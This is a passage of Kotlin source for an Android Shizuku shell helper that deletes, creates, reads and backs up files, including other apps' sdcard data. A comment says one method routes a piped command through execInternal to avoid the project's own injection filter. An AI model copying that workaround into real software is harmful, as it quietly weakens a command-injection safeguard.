        val safePath = sanitizeShellArg(path)
        val result = exec("rm -rf $safePath") ?: return null
        return result.exitCode == 0
    }

    /**
     * 创建目录。
     */
    fun createDirectory(path: String): Boolean? {
        if (!isValidPath(path)) {
            Log.w(TAG, "Invalid path: $path")
            return false
        }
        val safePath = sanitizeShellArg(path)
        val result = exec("mkdir -p $safePath") ?: return null
        return result.exitCode == 0
    }

    /**
     * 读取文本文件内容。
     *
     * @param path 文件路径
     * @param maxLines 最大返回行数
     */
    fun readFile(path: String, maxLines: Int = 200): String? {
        if (!isValidPath(path)) {
            Log.w(TAG, "Invalid path: $path")
            return "Error: invalid path"
        }
        if (!INT_REGEX.matches(maxLines.toString())) return null
        val safePath = sanitizeShellArg(path)
        val result = exec("head -n $maxLines $safePath") ?: return null
        if (result.exitCode != 0) {
            return "Error: ${result.stderr.trim()}"
        }
        return result.stdout
    }

    /**
     * 备份 App 数据目录到指定位置。
     *
     * shell UID 可以访问 /sdcard/Android/data/<package>/，
     * 因此可以备份任何 App 的 sdcard 数据。
     *
     * @param packageName App 包名
     * @param backupDir 备份目标目录
     */
    fun backupAppData(packageName: String, backupDir: String): String? {
        if (!isValidPackageName(packageName)) {
            Log.w(TAG, "Invalid package name: $packageName")
            return "Error: invalid package name"
        }
        if (!isValidPath(backupDir)) {
            Log.w(TAG, "Invalid backupDir: $backupDir")
            return "Error: invalid path"
        }
        val safePkg = sanitizeShellArg(packageName)
        val safeBackupDir = sanitizeShellArg(backupDir)
        val srcDir = "/sdcard/Android/data/$packageName"
        val dstDir = "$backupDir/$packageName"

        // 创建备份目录
        exec("mkdir -p $safeBackupDir/$safePkg")

        // 复制数据
        val result = exec("cp -r /sdcard/Android/data/$safePkg/ $safeBackupDir/$safePkg/") ?: return null
        if (result.exitCode != 0) {
            return "Backup failed: ${result.stderr.trim()}"
        }

        // 计算备份大小
        val size = getDirectorySize(dstDir)
        return "Backed up $packageName to $dstDir ($size)"
    }

    /**
     * 获取存储使用情况概览。
     */
    fun getStorageOverview(): String? {
        // 拆成两条独立命令，避免 && 被自家注入过滤器拦截
        val dfResult = exec("df -h /sdcard") ?: return null
        val duResult = execInternal("du -sh /sdcard/* 2>/dev/null | sort -rh | head -n 20")
        val sb = StringBuilder(dfResult.stdout.trim())
        if (duResult != null) {
            sb.append("\n---\n").append(duResult.stdout.trim())
        }
        return sb.toString()
    }

    // ======================== 数据类 ========================

    /**
     * Shell 命令执行结果。
     * [privileged]=false 表示 Shizuku 进程不可用，命令以 app UID 执行（或因需要权限被拒绝），见 [UnprivilegedShellFallback]。
     */
    data class ShellResult(
        val exitCode: Int,
        val stdout: String,
        val stderr: String,
        val privileged: Boolean = true,
    ) {
        val isSuccess: Boolean get() = exitCode == 0
    }
}
